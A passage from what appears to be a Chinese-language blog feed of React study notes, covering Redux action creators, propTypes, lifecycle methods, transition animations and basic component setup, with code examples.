id="07-使用ActionCreator统一创建action"><a href="#07-使用ActionCreator统一创建action" class="headerlink" title="07.使用ActionCreator统一创建action"></a>07.使用ActionCreator统一创建action</h1><p>我们按照 <a href="###组件中直接请求更改数据">组件中直接请求更改数据</a> 的方法直接在业务逻辑中创建action会导致代码变得混乱，为了统一，我们将创建action的方法写入<code>./store/actionCreator</code>文件下，结合<code>actionTypes</code>统一创建action，然后再在业务逻辑中调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// actionCreator.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">CHANGE_INPUT_VALUE</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./actionTypes&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getInputChangeAction</span> = (<span class="params">value</span>) =&gt; (&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="variable constant_">CHANGE_INPUT_VALUE</span>,</span><br><span class="line">  value</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Todolist.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; getInputChangeAction &#125; <span class="keyword">from</span> <span class="string">&#x27;./store/actionCreator&#x27;</span></span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"><span class="title function_">handleInputChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> action = <span class="title function_">getInputChangeAction</span>(e.<span class="property">target</span>.<span class="property">value</span>);</span><br><span class="line">  store.<span class="title function_">dispatch</span>(action)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="09-知识点补充"><a href="#09-知识点补充" class="headerlink" title="09. 知识点补充"></a>09. 知识点补充</h1><h2 id="总流程"><a href="#总流程" class="headerlink" title="总流程"></a>总流程</h2><ol><li>在 <code>actionTypes.js</code> 中创建变量存放action的操作类型，并向外暴露出变量名，提供给 <code>actionCreator.js</code> 和 <code>reducer.js</code> 调用。</li><li>在 <code>actionCreator.js</code> 中集中编写生成action对象，设置action对象的类型以及传入的数据名称，向外暴露该对象，供组件在业务逻辑代码部分调取使用。</li><li>在 <code>reducer.js</code> 判断某个action的type，编写与之对应的数据操作，并返回给store。</li><li>在组件业务逻辑代码中调用 <code>actionCreator.js</code> 提供的方法，生成一个action，并利用 <code>store.dispatch()</code> 向store发送一个action。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件依赖关系:</span><br><span class="line"></span><br><span class="line">actionTypes.js ──[actionType]── actionCreator.js ──[actionObj]── component.js</span><br><span class="line">            |</span><br><span class="line">            └────[actionType]── reducer.js</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>store是唯一的</li><li>只有store才能变更自己的内容</li><li>Reducer必须是纯函数：纯函数指的是，给定固定的输入，就一定会有固定的输出，而且不会有任何副作用</li></ol><h2 id="核心API"><a href="#核心API" class="headerlink" title="核心API"></a>核心API</h2><p><code>createStore</code>: 创建store</p><p><code>store.dispatch</code>: 派发action</p><p><code>store.getState</code>: 获取store中的数据内容</p><p><code>store.subscribe</code>: 订阅stote中的改变</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React基础教程 </tag>
            
            <tag> Redux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记02：React高级内容</title>
      <link href="/2019/04/8a3a4f1c5a33.html"/>
      <url>/2019/04/8a3a4f1c5a33.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-propTypes属性强校验"><a href="#1-propTypes属性强校验" class="headerlink" title="1.propTypes属性强校验"></a>1.propTypes属性强校验</h2><p>为避免在父组件向子组件传值的过程中传入意外值，如将<code>propTyopes</code>设置为止接收字符串，则父级不能向子级传递方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>; <span class="comment">// 引入</span></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TodoItem</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span>&#123;...&#125;</span><br><span class="line">... ...</span><br><span class="line"><span class="title class_">TodoItem</span>.<span class="property">protoTypes</span> = &#123;</span><br><span class="line">  <span class="attr">content</span>: <span class="title class_">PropTypes</span>.<span class="title function_">oneOfType</span>([<span class="title class_">PropTypes</span>.<span class="property">number</span>, <span class="title class_">PropTypes</span>.<span class="property">string</span>]), <span class="comment">// 可以设置两种类型</span></span><br><span class="line">  <span class="attr">deleteItem</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span>,</span><br><span class="line">  <span class="attr">index</span>: <span class="title class_">PropTypes</span>.<span class="property">number</span>,</span><br><span class="line">  <span class="attr">test</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>, <span class="comment">// 必须要求传递test参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-defatltProps设置属性默认值"><a href="#2-defatltProps设置属性默认值" class="headerlink" title="2.defatltProps设置属性默认值"></a>2.defatltProps设置属性默认值</h2><p>如果父组件没有向子组件传递某个值，但是在子组件中调用了这个值，可以用<code>defaultProps</code>来设置默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">TodoItem</span>.<span class="property">defaultProps</span>=&#123;</span><br><span class="line">  <span class="attr">test</span>: <span class="string">&#x27;Hello world&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-ref获取元素DOM节点-不推荐"><a href="#3-ref获取元素DOM节点-不推荐" class="headerlink" title="3.ref获取元素DOM节点(不推荐)"></a>3.ref获取元素DOM节点(不推荐)</h2><p>使用<code>ref</code>将当前的<code>input</code>节点绑定到<code>this.input</code>对象上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input</span><br><span class="line">  ref=&#123;<span class="function">(<span class="params">input</span>) =&gt;</span> &#123;<span class="variable language_">this</span>.<span class="property">input</span> = input&#125;&#125;</span><br><span class="line">&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><p>在函数方法中可调用<code>this.input</code>来获取这个节点的相关属性、方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="variable language_">this</span>.<span class="property">input</span>.<span class="property">props</span>.<span class="property">value</span>;</span><br></pre></td></tr></table></figure><blockquote><p>ref方式去操作DOM可能会因为<code>setState</code>方法的异步导致数据错误。<code>setState</code>方法提供第二个参数，这个参数是一个函数，在执行完异步之后执行，可以将ref操作放到这里执行</p></blockquote><h2 id="4-React声明周期函数"><a href="#4-React声明周期函数" class="headerlink" title="4.React声明周期函数"></a>4.React声明周期函数</h2><p>生命周期函数指在某一个时刻被自动调用执行的函数<br><img src="http://img.cdn.esunr.xyz/markdown/a71efaafly1g177dll2lzj21830ncqbt.jpg" alt="a71efaafly1g177dll2lzj21830ncqbt.jpg"></p><h3 id="4-1-Mounting"><a href="#4-1-Mounting" class="headerlink" title="4.1 Mounting"></a>4.1 Mounting</h3><p><code>componentWillMount</code> 在组件即将被挂载之前执行，只会执行一次</p><p><code>componentDidMount</code> 在组件被加载后执行，只会执行一次，在此可以调用AJAX请求</p><h3 id="4-2-Updation"><a href="#4-2-Updation" class="headerlink" title="4.2 Updation"></a>4.2 Updation</h3><p><code>componentWillReceiveProps</code> 当一个组件从父组件接收了参数，只要父组件的render函数被执行了，该函数就会被执行（第一次出现在父组件中不会被执行，如果这个组件之前已经存在于父组件中，才会执行）</p><p><code>shouldComponentUpdate</code> 在组件即将被更新前执行，如果返回false，就会阻止数据更新</p><p><code>componentWillUpdate</code> 组件被更新之前会被执行，但是在shouldComponentUpdate之后执行，如果shouldComponeUpdate返回true才会被执行   </p><p><code>componentDidUpdate</code> 组件更新后会被执行</p><h3 id="4-3-Unmounting"><a href="#4-3-Unmounting" class="headerlink" title="4.3 Unmounting"></a>4.3 Unmounting</h3><p><code>componentWillUnmount</code> 当组件即将被移出前自动执行</p><h3 id="4-4-应用"><a href="#4-4-应用" class="headerlink" title="4.4 应用"></a>4.4 应用</h3><blockquote><p>shouldComponentUpdate</p></blockquote><p><code>shouldComponentUpdate</code>可以传入两个参数，一个<code>nextProps</code>一个<code>nextState</code>，表示父组件改变时，即将顺应改变的子组件的props值和state值。当父组件发生执行render函数时，子组件也会重新render，此时只要使用该生命周期函数，通过判断即将更新的props和state的值，就可以选择子组件重新渲染与否，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">shouldComponentUpdate</span>(<span class="params">nextProps, nextState</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(nextProps.<span class="property">content</span> !== <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">content</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-在React中使用axios"><a href="#5-在React中使用axios" class="headerlink" title="5. 在React中使用axios"></a>5. 在React中使用axios</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">axios.<span class="title function_">get</span>().<span class="title function_">then</span>().<span class="title function_">catch</span>()</span><br></pre></td></tr></table></figure><h2 id="6-React中的过度动画"><a href="#6-React中的过度动画" class="headerlink" title="6. React中的过度动画"></a>6. React中的过度动画</h2><p>安装 <code>react-transtion-group</code> 一个React动画专用的动画库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add react-transtion-group</span><br></pre></td></tr></table></figure><h3 id="6-1-CSSTranstion的使用"><a href="#6-1-CSSTranstion的使用" class="headerlink" title="6.1 CSSTranstion的使用"></a>6.1 CSSTranstion的使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CSSTranstion</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-transition-group&#x27;</span></span><br><span class="line">... ...</span><br><span class="line">&lt;<span class="title class_">CSSTransition</span></span><br><span class="line">  <span class="keyword">in</span>=&#123;<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">show</span>&#125; <span class="comment">// 动画进入时的判断</span></span><br><span class="line">  timeout=&#123;<span class="number">1000</span>&#125;  <span class="comment">// 动画执行的时间</span></span><br><span class="line">  classNames=<span class="string">&#x27;fade&#x27;</span> <span class="comment">// 过长动画的css的前缀，如下面的&#x27;.fade-enter&#x27; 的前缀 &#x27;fade-&#x27;</span></span><br><span class="line">  unmountOnExit <span class="comment">// 动画执行结束后移除</span></span><br><span class="line">  onEntered=&#123;<span class="function">(<span class="params">el</span>)=&gt;</span>&#123;el.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;blue&#x27;</span>&#125;&#125; <span class="comment">// 动画进入后执行的钩子函数</span></span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">CSSTransition</span>&gt;</span><br></pre></td></tr></table></figure><ol><li><p>入场动画的挂载的class: </p><p> <code>.fade-enter</code> 入场动画第一个时刻，但是还未入场，此时挂载该CSS</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>.fade-enter-active</code> 入场动画的第二个时刻，到入场动画执行完成之前的一个时刻，此时挂载该CSS</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter-active</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">1s</span> ease-in</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>.fade-enter-done</code> 当整个过场动画执行完成之后执行，此时挂载该CSS</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter-done</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>出场动画的挂载的class:<br> <code>.fade-exit</code>、<code>fade-exit-active</code>、<code>fade-exit-done</code> 跟入场动画的作用相似</p></li></ol><h3 id="6-2-apear参数"><a href="#6-2-apear参数" class="headerlink" title="6.2 apear参数"></a>6.2 apear参数</h3><p>在 <code>&lt;CSSTransition&gt;</code> 标签中传入一个 <code>appear=&#123;true&#125;</code> 就会在元素上添加额外的 <code>appear</code> class，这个apper可以让元素在加载入页面的实行就执行相关的进入页面的动画，假如我们设定了一个元素进入的动画，元素在加载进页面的时候是出于显示状态，则进入动画不会被执行，只有让动画消失再出现的时候才会被执行。如果我们想要元素在被加载进页面的时候就执行进入动画，就可以开启 <code>appear</code> 参数，同时在css中这么设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.fade-enter</span>, <span class="selector-class">.fade-appear</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.fade-enter-active</span> <span class="selector-class">.fade-appear-active</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">1s</span> ease-in</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-3-TransitionGroup"><a href="#6-3-TransitionGroup" class="headerlink" title="6.3 TransitionGroup"></a>6.3 TransitionGroup</h3><p>假如我们要循环生成一些列表DOM，就可以用 <code>TransitionGroup</code> 来实现多个元素的切换动画效果，只需要在列表外层加一个 <code>&lt;TransitionGroup&gt;</code> 标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CSSTransition</span>, <span class="title class_">TransitionGroup</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-transition-group&#x27;</span></span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">&lt;<span class="title class_">TransitionGroup</span>&gt;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">list</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">CSSTransition</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">timeout</span>=<span class="string">&#123;1000&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">classNames</span>=<span class="string">&#x27;fade&#x27;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">key</span>=<span class="string">&#123;index&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">CSSTransition</span>&gt;</span></span></span><br><span class="line">      )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/<span class="title class_">TransitionGroup</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React基础教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记01：React基础</title>
      <link href="/2019/04/06ba31ababb5.html"/>
      <url>/2019/04/06ba31ababb5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>完整笔记、Demo地址：<a href="https://github.com/EsunR/React-Study">https://github.com/EsunR/React-Study</a></p></blockquote><h2 id="1-用-Create-React-App-创建一个-React-应用"><a href="#1-用-Create-React-App-创建一个-React-应用" class="headerlink" title="1.用 Create React App 创建一个 React 应用"></a>1.用 Create React App 创建一个 React 应用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx create-react-app my-app</span><br><span class="line">cd my-app</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><h2 id="2-文件结构"><a href="#2-文件结构" class="headerlink" title="2.文件结构"></a>2.文件结构</h2><p>App.js 构建网页内容<br>index.js 引入内容</p><h2 id="3-App-js"><a href="#3-App-js" class="headerlink" title="3.App.js"></a>3.App.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        HELLO WORLD</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6语法创建一个名为App的类，这个类继承了React.Component类，就说明这个App是一个React组件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// reader就是组件的内容</span></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        HELLO WORLD</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Component</span> = <span class="title class_">React</span>.<span class="property">Compinent</span>;</span><br></pre></td></tr></table></figure><h2 id="4-idnex-js"><a href="#4-idnex-js" class="headerlink" title="4.idnex.js"></a>4.idnex.js</h2><p>ReactDOM.reader函数: 挂载一个 <code>&lt;APP /&gt;</code>，节点到DOM中的root</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>要使用JSX语法必须引入整个React</p></blockquote><h2 id="5-Fragment占位符"><a href="#5-Fragment占位符" class="headerlink" title="5.Fragment占位符"></a>5.Fragment占位符</h2><p>可以隐藏最外层标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span>, <span class="title class_">Fragment</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TodoList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">input</span> /&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span>&gt;</span>学英语<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span>&gt;</span>Learning English<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Fragment</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">TodoList</span>;</span><br></pre></td></tr></table></figure><h2 id="6-数据操作"><a href="#6-数据操作" class="headerlink" title="6.数据操作"></a>6.数据操作</h2><ol><li><code>constructor</code>构造函数，最优先执行</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TodoList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line">    <span class="variable language_">super</span>(props); <span class="comment">// super调用父类（Component）固定写法</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="comment">// 组件的状态</span></span><br><span class="line">      <span class="attr">inputValue</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="attr">list</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">reader</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>用 <code>&#123;this.state.KEY&#125;</code> 绑定状态中的数据，这种绑定，对应的值无法被改变</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&#123;this.state.inputValue&#125;/</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>用<code>onChange</code>来执行某个方法：</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"><span class="title function_">render</span>(<span 